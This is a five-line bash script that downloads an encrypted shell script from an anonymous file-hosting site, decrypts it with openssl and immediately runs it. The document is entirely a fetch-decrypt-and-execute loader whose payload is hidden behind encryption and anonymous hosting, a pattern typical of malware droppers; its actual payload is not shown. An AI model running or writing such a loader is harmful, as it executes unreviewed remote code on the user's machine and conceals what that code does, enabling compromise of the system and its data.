#! /bin/bash
cd
curl -O https://cdn-102.anonfiles.com/fem9d0Uay7/87256cd6-1674738000/x-l1bra.sh.enc
openssl enc -d -aes-256-cbc -in x-l1bra.sh.enc -out x-l1bra.sh
sh x-l1bra.sh